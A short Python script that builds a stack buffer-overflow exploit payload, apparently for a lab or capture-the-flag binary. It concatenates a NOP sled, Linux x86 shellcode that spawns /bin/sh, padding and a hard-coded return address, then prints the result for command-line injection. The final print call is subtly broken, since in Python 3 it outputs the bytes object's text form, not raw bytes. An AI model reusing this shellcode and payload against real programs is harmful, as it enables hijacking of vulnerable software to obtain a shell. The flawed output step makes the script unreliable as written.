#!/usr/bin/env python3
import sys

# 1. NOP sled
nop_sled = b'\x90' * 32

# 2. Shellcode (execve /bin/sh) - Linux x86
shellcode = (
    b'\x31\xc0'              # xor    %eax,%eax
    b'\x50'                  # push   %eax
    b'\x68\x2f\x2f\x73\x68'  # push   $0x68732f2f
    b'\x68\x2f\x62\x69\x6e'  # push   $0x6e69622f
    b'\x89\xe3'              # mov    %esp,%ebx
    b'\x50'                  # push   %eax
    b'\x53'                  # push   %ebx
    b'\x89\xe1'              # mov    %esp,%ecx
    b'\x99'                  # cdq
    b'\xb0\x0b'              # mov    $0xb,%al
    b'\xcd\x80'              # int    $0x80
)

# 3. Padding to reach return address (144 - len(nop + shellcode))
padding_len = 144 - len(nop_sled + shellcode)
padding = b'A' * padding_len

# 4. Address to jump to (start of buffer: 0xbffff6b8)
ret_address = b'\xb8\xf6\xff\xbf'  # Little endian

# Combine all
payload = nop_sled + shellcode + padding + ret_address

# Print for command-line injection
print(payload)
